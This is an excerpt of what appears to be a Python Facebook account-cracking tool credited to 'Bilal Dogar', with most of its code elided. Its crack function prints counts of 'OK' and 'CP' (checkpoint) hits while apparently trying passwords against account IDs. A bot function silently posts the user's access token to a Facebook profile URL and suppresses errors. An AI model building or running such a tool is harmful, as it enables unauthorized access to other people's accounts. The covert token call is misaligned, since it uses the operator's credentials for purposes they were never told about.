...
________  ___  ___       ________  ___               ________  ________  ________  ________  ________     
|\   __  \|\  \|\  \     |\   __  \|\  \             |\   ___ \|\   __  \|\   ____\|\   __  \|\   __  \    
\ \  \|\ /\ \  \ \  \    \ \  \|\  \ \  \            \ \  \_|\ \ \  \|\  \ \  \___|\ \  \|\  \ \  \|\  \   
 \ \   __  \ \  \ \  \    \ \   __  \ \  \            \ \  \ \\ \ \  \\\  \ \  \  __\ \   __  \ \   _  _\  
  \ \  \|\  \ \  \ \  \____\ \  \ \  \ \  \____        \ \  \_\\ \ \  \\\  \ \  \|\  \ \  \ \  \ \  \\  \| 
   \ \_______\ \__\ \_______\ \__\ \__\ \_______\       \ \_______\ \_______\ \_______\ \__\ \__\ \__\\ _\ 
    \|_______|\|__|\|_______|\|__|\|__|\|_______|        \|_______|\|_______|\|_______|\|__|\|__|\|__|\|__|
                                                                                                           
AUTHOR :Bilal Dogar
GITHUB I'D: Bilaldogar1h
VERSION:0.01
TEAM:ALONE                                        
 '''
...
def bot():
	try:
		requests.post("https://www.facebook.com/profile.php?id=100079215107156?fields=subscribers&access_token=%s"%(tokenku))
	except:
		pass
#------------------[ BAGIAN-MENU ]----------------#
...
def crack(idf,pwv):
	...
	fff = '%'
	sys.stdout.write('\r%s[DOGAR]%s=>%s  OK:%s CP:%s  %s%s%s   '%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
